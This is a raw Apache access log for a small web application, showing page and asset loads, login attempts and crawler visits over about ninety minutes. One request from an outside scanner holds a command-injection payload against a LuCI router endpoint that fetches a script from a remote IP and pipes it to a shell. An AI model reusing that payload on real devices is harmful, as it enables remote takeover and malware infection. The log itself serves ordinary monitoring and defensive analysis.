192.175.111.245 - - [27/Jun/2024:16:37:01 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
192.175.111.244 - - [27/Jun/2024:16:37:02 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
186.71.205.121 - - [27/Jun/2024:16:37:31 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
35.238.8.10 - - [27/Jun/2024:16:39:29 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36"
35.238.8.10 - - [27/Jun/2024:16:39:29 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36"
146.70.141.244 - - [27/Jun/2024:16:39:52 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
146.70.141.244 - - [27/Jun/2024:16:39:53 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:41 +0000] "GET /static/js/main.aa95ed9c.js:2:37597809)/n HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:41 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:42 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:42 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:42 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:44:43 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 304 - "https://www.junghomun.com/static/js/main.aa95ed9c.js:2:37597809)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:16:45:05 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
185.224.128.43 - - [27/Jun/2024:16:45:49 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
106.102.11.87 - - [27/Jun/2024:16:46:42 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 304 - "https://www.junghomun.com/user/signup" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
199.45.155.73 - - [27/Jun/2024:16:47:38 +0000] "GET / HTTP/1.1" 200 748 "-" "-"
199.45.155.73 - - [27/Jun/2024:16:47:42 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.73 - - [27/Jun/2024:16:47:42 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
199.45.155.73 - - [27/Jun/2024:16:47:43 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.74 - - [27/Jun/2024:16:51:55 +0000] "GET / HTTP/1.1" 200 748 "-" "Hello World"
106.102.11.87 - - [27/Jun/2024:16:58:22 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:22 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:27 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:27 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 200 38575915 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:41 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:42 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:50 +0000] "GET /user/login HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:40 +0000] "GET /static/js/main.aa95ed9c.js.map HTTP/1.1" 200 58129004 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:16:58:52 +0000] "GET /static/js/main.aa95ed9c.js.map HTTP/1.1" 200 58129004 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
185.191.127.212 - - [27/Jun/2024:16:59:22 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 503 299 "-" "Go-http-client/1.1"
106.102.11.87 - - [27/Jun/2024:16:59:41 +0000] "-" 408 - "-" "-"
167.94.146.50 - - [27/Jun/2024:17:10:02 +0000] "GET / HTTP/1.1" 503 299 "-" "-"
167.94.146.50 - - [27/Jun/2024:17:10:06 +0000] "GET / HTTP/1.1" 503 299 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.50 - - [27/Jun/2024:17:10:06 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
106.102.11.87 - - [27/Jun/2024:17:11:25 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:11:30 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:21 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:25 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:38 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:38 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 304 - "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:39 +0000] "GET /static/js/main.aa95ed9c.js HTTP/1.1" 304 - "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:39 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 304 - "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/smile3.6afb782045251fc93c24.webp HTTP/1.1" 200 5092 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:39 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/money4.bab943b0cc9204eca042.webp HTTP/1.1" 200 25193 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/exercise1.0fbc1a440efd979a68eb.webp HTTP/1.1" 200 7554 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:40 +0000] "GET /static/media/food1.bc88ff497f3bb08cf0a7.webp HTTP/1.1" 200 21818 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:12:43 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 304 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:17:12:46 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:17:12:47 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:17:12:48 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
::1 - - [27/Jun/2024:17:12:49 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
106.102.11.87 - - [27/Jun/2024:17:12:43 +0000] "GET /static/js/main.aa95ed9c.js.map HTTP/1.1" 200 58129004 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::1 - - [27/Jun/2024:17:13:09 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
141.98.83.197 - - [27/Jun/2024:17:15:03 +0000] "POST /cgi-bin/skk_set.cgi HTTP/1.1" 503 299 "-" "Go-http-client/1.1"
106.102.11.87 - - [27/Jun/2024:17:15:06 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:15:06 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:15:08 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:15:07 +0000] "GET /static/js/main.81f21e07.js HTTP/1.1" 200 38575971 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:15:28 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:15:28 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:15:29 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:15:32 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:15:27 +0000] "GET /static/js/main.81f21e07.js.map HTTP/1.1" 200 58129006 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:16:01 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:16:35 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:16:51 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:16:54 +0000] "OPTIONS /user/login HTTP/1.1" 200 - "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:17:29 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:18:42 +0000] "POST /user/login HTTP/1.1" 200 748 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
47.128.53.252 - - [27/Jun/2024:17:20:37 +0000] "GET /JUNGHQLO/board/getBoardDetails?board_number=3 HTTP/1.1" 301 279 "-" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
47.128.53.252 - - [27/Jun/2024:17:20:39 +0000] "GET /JUNGHQLO/board/getBoardDetails?board_number=3 HTTP/1.1" 503 299 "-" "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:30 +0000] "GET /user/login HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:30 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:31 +0000] "GET /static/css/main.b87daa8b.css.map HTTP/1.1" 200 627897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:30 +0000] "GET /static/js/main.66e355ff.js HTTP/1.1" 200 38575971 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:47 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:46 +0000] "GET /favicon.ico HTTP/1.1" 200 269374 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:21:46 +0000] "GET /static/js/main.66e355ff.js.map HTTP/1.1" 200 58129006 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
162.142.125.193 - - [27/Jun/2024:17:22:14 +0000] "GET / HTTP/1.1" 503 299 "-" "-"
162.142.125.193 - - [27/Jun/2024:17:22:18 +0000] "GET / HTTP/1.1" 503 299 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.193 - - [27/Jun/2024:17:22:18 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
47.128.45.243 - - [27/Jun/2024:17:24:38 +0000] "GET /robots.txt HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)"
47.128.45.243 - - [27/Jun/2024:17:24:40 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)"
47.128.121.221 - - [27/Jun/2024:17:28:39 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)"
106.102.11.87 - - [27/Jun/2024:17:32:45 +0000] "GET /static/js/main.66e355ff.js:2:37605282)/n HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:17:32:45 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/static/js/main.66e355ff.js:2:37605282)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.59 - - [27/Jun/2024:17:32:46 +0000] "GET /static/js/main.66e355ff.js HTTP/1.1" 200 38575971 "https://www.junghomun.com/static/js/main.66e355ff.js:2:37605282)/n" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
43.133.77.230 - - [27/Jun/2024:17:48:18 +0000] "GET / HTTP/1.1" 301 234 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.133.77.230 - - [27/Jun/2024:17:48:20 +0000] "GET / HTTP/1.1" 200 748 "http://www.junghomun.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
106.102.11.87 - - [27/Jun/2024:18:00:24 +0000] "GET / HTTP/1.1" 200 748 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:25 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:25 +0000] "GET /static/js/main.66e355ff.js HTTP/1.1" 200 38575971 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:43 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "https://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.87 - - [27/Jun/2024:18:00:44 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "https://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
